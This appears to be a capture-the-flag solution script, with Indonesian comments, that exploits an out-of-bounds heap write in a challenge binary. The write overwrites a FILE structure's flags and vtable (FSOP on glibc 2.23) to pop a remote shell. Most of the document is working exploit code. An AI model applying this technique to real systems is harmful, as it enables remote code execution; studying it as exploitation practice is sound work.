"""
Vuln terdapat pada fungsi readNum dimana saat array dimasukan nilai, index tidak dicek sehingga menyebabkan Out of Boundary.
Jika kita perhatikan pada bagian heap, array num_arr tepat berada di atas struktur FILE.

### Exploit ###
Kita bisa menggunakan File Stream Oriented Programming dimana kita mengoverwrite vtable dan _flag dengan address sistem dan string "/bin/sh"
untuk memanggil remote shell. Karena libc yang digunakan 2.23, maka tidak ada pengecekan pada vtable.
Pada _IO_file_close_it+282 terdapat call QWORD PTR [rax+0x88] dimana rax merupakan pointer vtable dengan rdi (&_flag) sebagai argumen pertama.
Karena kita akan memanggil system, kita bisa mengoverwrite vtable dengan address GOT system-0x88 atau 0x403f00.
_flag dapat dioverwrite dengan string "/bin/sh"
"""

from pwn import *
from math import sqrt
# context.log_level='debug'

# r = process("./math2")
# attach(r, '''
# b*0x00000000004016ff
# # ''')

r = remote('0.0.0.0', 4000)
# attach(pidof('math2')[0],'''
# b*0x000000000040173b
# b*0x0000000000401609
# commands 2
#     silent
#     set {void*}0x405570=0x68732f6e69622f
#     set {void*}0x405648=0x403f00
#     c
#     end
# c
# ''')

# attach(pidof('math2')[0],'''
# b*0x0000000000401719
# c
# ''')

def getPrimeFactor(n):
    t = ''
    while(n%2 == 0):
        t += '2 '
        n /= 2
    kk = int(sqrt(n)) + 1
    for k in range(3, kk, 2):
        while(n%k == 0):
            t += str(k) + ' '
            n /= k
    if(n > 2):
        t += str(n) + ' '
    return t[:-1]

# Kita akan overwrite struktur file stream saat iterasi terakhir
r.recvuntil("1\n")
for i in range(99):
    n = int(r.recvline()[:-1])
    r.sendlineafter("> ", getPrimeFactor(n) + ' 1')

n = int(r.recvline()[:-1])
t = getPrimeFactor(n).split(' ')
t += ['+']*(20-len(t)) # padding, lambang +/- akan diabaikan oleh scanf
t += ['1852400175'] # _flags (/bin/sh)
t += ['6845231']
t += ['+']*52 # padding
t += [str(0x403f18)] # vtabel

r.sendlineafter("> ", ' '.join(t) + " 1")
r.sendlineafter("> ", '6')
r.interactive()